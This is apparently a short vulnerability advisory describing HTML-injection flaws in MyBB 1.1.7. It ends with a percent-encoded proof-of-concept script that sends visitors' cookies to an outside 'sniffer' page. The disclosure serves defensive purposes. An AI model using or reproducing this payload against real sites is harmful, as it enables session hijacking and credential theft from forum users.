source: http://www.securityfocus.com/bid/19718/info

MyBB is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content. 

Attacker-supplied HTML and script code would execute in the context of the affected website, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.

Version 1.1.7 is vulnerable; other versions may be affected.

&3c%73%63%72%69%70%74%3e%69%6d%67%20%3d%20%6e%65%77%20%49%6d%61%67%65%28%29%3b%20%69%6d%67%2e%73%72%63%20%3d%20%22%68%74%7
4%70%3a%2f%2f%77%77%77%2e%68%61%79%6c%61%7a%6c%61%72%2e%6f%72%67%2f%73%6e%69%66%66%65%72%2f%73%2e%70%68%70%3f%22%2b%64%6f%
63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e